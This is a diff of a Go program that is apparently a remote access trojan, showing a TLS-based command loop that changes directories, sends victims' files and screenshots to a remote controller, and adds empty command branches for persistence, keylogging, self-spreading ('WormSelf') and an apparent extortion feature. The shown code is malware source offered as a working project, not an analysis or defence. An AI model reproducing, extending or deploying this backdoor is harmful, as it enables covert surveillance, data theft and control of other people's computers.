@@ -1,34 +1,11 @@
 package main
 
-/*
-import(
-    "fmt"
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-    "github.com/fatih/color"
-)*/
 import (
 	"bytes"
 	"crypto/sha256"
 	"crypto/tls"
 	"encoding/hex"
 	"fmt"
-	"github.com/fatih/color"
-	"github.com/kbinani/screenshot"
 	"image/png"
 	"io"
 	"log"
@@ -39,6 +16,9 @@ import (
 	"strconv"
 	"strings"
 	"syscall"
+
+	"github.com/fatih/color"
+	"github.com/kbinani/screenshot"
 )
 
 // BUFFSIZE is the buffer for communication
@@ -124,10 +104,9 @@ func getmaskedshell(conn *tls.Conn) {
 	var command string
 	cmdbuff = make([]byte, BUFFSIZE)
 	var osshell string
-	//fmt.Println("Welcome to Mask")
 	for {
 		conn.Write([]byte(get_Current_Directory()))
-		get_Current_Directory()
+
 		recvdbytes, err := conn.Read(cmdbuff[0:])
 		if err != nil {
 			os.Exit(0)
@@ -138,17 +117,31 @@ func getmaskedshell(conn *tls.Conn) {
 			conn.Close()
 			os.Exit(0)
 		} else if strings.Index(command, "cd") == 0 {
-			fname := strings.Split(command, " ")[1]
-			fmt.Println(fname)
-			finflag := make(chan string)
-			go sendFile(conn, fname, finflag)
-			//<-finflag
+			var Dir string
+			Dir = strings.Replace(command, "cd ", "", 1)
+			Dir = strings.Replace(Dir, "\r\n", "", 1)
+			err = os.Chdir(Dir)
+			if err != nil {
+				fmt.Println(err)
+				fmt.Println(Dir)
+				conn.Write([]byte("Unable to Do the job!"))
+			}
 		} else if strings.Index(command, "get") == 0 {
 			fname := strings.Split(command, " ")[1]
 			fmt.Println(fname)
 			finflag := make(chan string)
 			go sendFile(conn, fname, finflag)
-			//<-finflag
+
+		} else if strings.Index(command, "Persistance") == 0 {
+		} else if strings.Index(command, "ScreenCreapyON") == 0 {
+		} else if strings.Index(command, "ScreenCreapyOFF") == 0 {
+
+		} else if strings.Index(command, "KeyCreaperOFF") == 0 {
+
+		} else if strings.Index(command, "WormSelf") == 0 {
+
+		} else if strings.Index(command, "MoneyThoseSectoids") == 0 { //TODO
+
 		} else if strings.Index(command, "grabscreen") == 0 {
 			filenames := getscreenshot()
 			finflag := make(chan string)
@@ -156,7 +149,6 @@ func getmaskedshell(conn *tls.Conn) {
 				go sendFile(conn, fname, finflag)
 				<-finflag
 				go removetempimages(filenames, finflag)
-				//<-finflag
 
 			}
 		} else {
